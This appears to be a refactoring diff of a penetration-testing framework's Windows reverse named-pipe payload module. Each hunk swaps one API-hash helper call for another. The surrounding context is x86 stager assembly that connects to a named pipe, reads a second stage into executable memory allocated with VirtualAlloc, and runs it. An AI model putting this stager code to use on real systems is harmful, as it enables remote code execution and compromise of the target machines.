@@ -126,7 +126,7 @@ module Payload::Windows::ReverseNamedPipe
         db "#{full_pipe_name}", 0x00
       get_pipe_name:
                                 ; lpFileName (via call)
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
+        push #{block_api_hash('kernel32.dll', 'CreateFileA')}
         call ebp                ; CreateFileA(...)
 
         ; If eax is -1, then we had a failure.
@@ -147,7 +147,7 @@ module Payload::Windows::ReverseNamedPipe
     else
       asm << %Q^
       failure:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        push #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call ebp
       ^
     end
@@ -172,7 +172,7 @@ module Payload::Windows::ReverseNamedPipe
         push 4                  ; nNumberOfBytesToRead = sizeof( DWORD );
         push esi                ; lpBuffer
         push edi                ; hFile
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        push #{block_api_hash('kernel32.dll', 'ReadFile')}
         call ebp                ; ReadFile(...) to read the size
     ^
 
@@ -195,7 +195,7 @@ module Payload::Windows::ReverseNamedPipe
         push 0x1000             ; MEM_COMMIT
         push esi                ; push the newly received second stage length.
         push 0                  ; NULL as we dont care where the allocation is.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         xchg ebx, eax           ; ebx = our new memory address for the new stage
@@ -217,7 +217,7 @@ module Payload::Windows::ReverseNamedPipe
         push ecx                ; nNumberOfBytesToRead
         push ebx                ; lpBuffer
         push edi                ; hFile
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        push #{block_api_hash('kernel32.dll', 'ReadFile')}
         call ebp                ; ReadFile(...) to read the data
     ^
 
@@ -237,7 +237,7 @@ module Payload::Windows::ReverseNamedPipe
         push 0x4000             ; dwFreeType (MEM_DECOMMIT)
         push 0                  ; dwSize
         push eax                ; lpAddress
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        push #{block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
         ; restore the stack (one more pop after 2nd ReadFile call)
         pop esi
@@ -245,7 +245,7 @@ module Payload::Windows::ReverseNamedPipe
       cleanup_file:
         ; clear up the named pipe handle
         push edi                ; named pipe handle
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
+        push #{block_api_hash('kernel32.dll', 'CloseHandle')}
         call ebp                ; CloseHandle(...)
 
         ; restore the stack back to the connection retry count
